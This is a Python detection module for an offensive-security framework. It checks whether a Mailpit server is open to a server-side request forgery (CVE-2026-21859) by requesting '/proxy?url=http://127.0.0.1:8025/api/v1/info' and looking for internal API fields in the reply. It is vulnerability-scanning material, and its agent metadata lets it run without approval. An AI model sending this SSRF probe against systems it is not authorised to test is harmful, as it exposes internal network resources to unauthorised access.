#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mailpit <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mailpit < 1.28.3 - Server-Side Request Forgery Detection',
        'description': 'Mailpit <= 1.28.0 contains a server-side request forgery caused by insufficient validation of internal IP addresses in the /proxy endpoint, letting attackers make requests to internal network resources, exploit requires crafted HTTP GET requests.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'mailpit', 'axllent', 'oast', 'oob', 'ssrf', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://rosecurify.com/advisories/RO-26-001-mailpit-server-side-request-forgery-ssrf/',
            'https://github.com/axllent/mailpit/security/advisories/GHSA-8v65-47jx-7mfr',
        ],
        'cve': 'CVE-2026-21859',
    }

    def run(self):
        path = '/proxy?url=http://127.0.0.1:8025/api/v1/info'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"Version"', '"Database"', '"RuntimeStats"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Mailpit < 1.28.3 - Server-Side Request Forgery detected', path=path)
            return True
        return False

